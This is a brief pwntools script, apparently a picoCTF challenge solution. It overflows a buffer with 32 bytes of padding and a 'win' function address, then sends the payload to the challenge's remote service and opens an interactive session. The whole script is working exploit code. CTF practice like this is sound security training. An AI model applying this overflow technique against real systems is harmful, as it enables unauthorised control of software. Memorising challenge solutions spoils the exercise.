from pwn import *

win = 0x4011a0
padding = b'aaaabbbbccccddddeeeeffffgggghhhh'
payload = padding + p64(win)
chall = remote('mimas.picoctf.net', 58576)
chall.sendlineafter(b'your choice: ',b'2')
chall.sendlineafter(b'buffer: ',payload)
chall.sendlineafter(b'your choice: ',b'4')
chall.interactive()
